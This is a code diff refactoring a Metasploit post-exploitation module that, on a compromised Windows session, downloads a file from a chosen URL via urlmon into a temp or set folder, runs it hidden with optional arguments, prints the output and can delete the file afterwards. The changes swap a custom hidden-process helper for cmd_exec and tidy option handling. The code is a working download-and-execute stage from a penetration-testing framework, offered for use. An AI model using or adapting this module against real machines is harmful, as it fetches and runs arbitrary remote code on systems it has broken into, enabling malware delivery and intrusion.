@@ -11,9 +11,11 @@
 
 require 'msf/core'
 require 'rex'
+require 'msf/core/post/common'
 require 'msf/core/post/file'
 
 class Metasploit3 < Msf::Post
+  include Msf::Post::Common
 	include Msf::Post::File
 
 	def initialize(info={})
@@ -58,21 +60,9 @@ class Metasploit3 < Msf::Post
 		])
 			print_good("urlmon loaded and configured") if datastore['VERBOSE']
 		else
-			print_status("urlmon already loaded") if datastore['VERBOSE']
+			vprint_good("urlmon already loaded")
 		end
 
-	end
-
-	def run_cmd(cmd)
-		process = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
-		res = ""
-		while (d = process.channel.read)
-			break if d == ""
-			res << d
-		end
-		process.channel.close
-		process.close
-		return res
 	end
 
 	def run
@@ -87,12 +77,14 @@ class Metasploit3 < Msf::Post
 		# check/set vars
 		url = datastore["URL"]
 		filename = datastore["FILENAME"] || url.split('/').last
-		path = session.fs.file.expand_path(datastore["DOWNLOAD_PATH"]) || session.fs.file.expand_path("%TEMP%")
+		if datastore["DOWNLOAD_PATH"].nil? or datastore["DOWNLOAD_PATH"].empty?
+			path = session.fs.file.expand_path("%TEMP%")
+		else
+			path = session.fs.file.expand_path(datastore["DOWNLOAD_PATH"])
+		end
 		outpath = path + '\\' + filename
 		exec = datastore["EXECUTE"]
 		exec_string = datastore["EXEC_STRING"]
-		output = datastore['OUTPUT']
-		remove = datastore['DELETE']
 
 
 		# set up railgun
@@ -109,13 +101,14 @@ class Metasploit3 < Msf::Post
 
 		# run our command
 		if exec
-			cmd = outpath + ' ' + exec_string
-			res = run_cmd(cmd)
-			print_good(res) if output
+			exec_string = nil if exec_string.empty?
+      vprint_good("Running #{outpath}")
+			res = cmd_exec(outpath, exec_string, 60)
+			print_good(res) if datastore['OUTPUT']
 
 					# remove file if needed
-			if remove
-				print_status("\tDeleting #{outpath}") if datastore['VERBOSE']
+			if datastore['DELETE']
+				vprint_good("\tDeleting #{outpath}")
 				session.fs.file.rm(outpath)
 			end
 		end
